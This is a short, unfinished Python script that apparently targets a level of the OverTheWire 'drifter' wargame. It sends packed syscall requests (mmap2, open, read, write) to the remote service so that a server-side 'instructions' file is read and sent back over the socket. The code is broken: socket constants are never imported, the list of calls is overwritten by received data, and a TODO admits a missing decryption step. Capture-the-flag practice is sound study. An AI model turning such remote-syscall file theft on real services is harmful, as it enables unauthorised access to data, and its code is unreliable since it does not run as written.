#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import struct

host = 'drifter.labs.overthewire.org'
port = 1111

s = socket.socket(AF_INET, SOCK_STREAM)
s.connect((host, port))

data = [
        [192, 0, 4096, 3, 33, -1, 0, 0, 0],   # mmap2 some memory
        [3, 4, len("instructions"), 0, 0, 0, 0, 0],      # read into buffer to get filename. source fd needed is 4.
        #[4],      # write filename from allocated memory location to your client socket
        [5, 0, 0, 0, 0, 0, 0, 0],      # open instructions file, get fd allocated to in response
        [3, 256, 0, 0, 0, 0, 0],      # read from the allocated file descriptor to your allocated memory
        [4, 4, 256, 0, 0, 0, 0, 0]       # write from the allocated buffer to the socket on the server (fd 4)
       ]

data_index = 0

for fun in data:
    packed_fun = ""
    for arg in fun:
        packed_fun += struct.pack("i", arg)
    s.send(packed_fun)
    data = s.recv(2048)
    if len(data) == 4:

        # TODO: integer must be decrypted beforehand
        if data_index == 0:
            print("mmapped addr : ", hex(struct.unpack("i",data)[0]))
            data[1].insert(2, struct.unpack("i",data)[0]) # give addr to write there the filename str

            data[2].insert(1, struct.unpack("i",data)[0]) # give buffer address with filename str
            data[3].insert(1, struct.unpack("i",data)[0]) # give buffer for writing file content

            data[4].insert(2, struct.unpack("i",data)[0]) # give buffer for writing file content to socket
        elif data_index == 2:
            data[3].insert(1, struct.unpack("i",data)[0]) # give fd of instructions file
        else:
            print(struct.unpack("i",data))
    else:
        print(data)
    data_index += 1
